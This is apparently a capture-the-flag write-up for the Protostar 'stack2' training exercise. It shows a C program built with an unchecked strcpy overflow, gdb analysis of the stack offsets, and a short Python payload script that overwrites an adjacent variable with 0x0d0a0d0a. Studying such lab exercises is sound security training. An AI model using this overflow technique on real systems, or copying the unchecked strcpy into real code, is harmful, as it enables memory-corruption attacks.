# Stack2 Challenge

First let's login to the **protostar VM** through ssh and navigate to **/opt/protostar/bin** to locate the challenge.
The source code for the challenge is very helpful and available <a href="https://exploit-exercises.lains.space/protostar/stack2/">here.</a>

Let's take a look

```c

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```
**Important note:** From this challenge onwards the classic version of gdb will be used since the protostar VM doesnt have **gef** and I had no luck installing it.

As you can see the code now doesn't ask us for a command line argument but for an **envieronment** variable named **GREENIE**. We have to set this variable to not get an error message. Next the challenge is pretty much the same as the first one, and you can find a more detailed writeup <a href="https://github.com/astasinos/Writeups/tree/master/Binary%20Exploitation%20%26%20Reverse%20Engineering/protostar/stack1">there</a>.

We somehow must set the **modified** variable from **0** to **0x0d0a0d0a**.

We also notice that the value in the environment variable is copied in the buffer.

Let's first set the **GREENIE** variable and then fire up gdb in the **VM** and set the assembly syntax to our familiar **intel**. (Try disassembling main without changing syntax and you will see that the asssembly syntax is not what you usually see).


<img src="https://github.com/astasinos/Writeups/blob/master/Binary%20Exploitation%20%26%20Reverse%20Engineering/protostar/stack2/images/start_stack2.png">    

<img src="https://github.com/astasinos/Writeups/blob/master/Binary%20Exploitation%20%26%20Reverse%20Engineering/protostar/stack2/images/disas_main_st2.png">

Taking a closer look

<img src="https://github.com/astasinos/Writeups/blob/master/Binary%20Exploitation%20%26%20Reverse%20Engineering/protostar/stack2/images/explend.png">  

So our buffer starts at **esp+0x18** and **modified** is at **esp+0x58** . **0x58 - 0x18 = 64** . So we will need **64** bytes of junk and then whatever **4** bytes we input next will overwrite **modified**. 

Create a simple python script to do the job for us 

```python                                  

#!/usr/bin/env python
from struct import pack

prepend = b"A" * 64
prepend += pack("<L",0x0d0a0d0a)   # pack desired value as Little Endian
print prepend
```

Now lets set **GREENIE** to the right value and execute.

<img src="https://github.com/astasinos/Writeups/blob/master/Binary%20Exploitation%20%26%20Reverse%20Engineering/protostar/stack2/images/end_st2.png">

### Success!


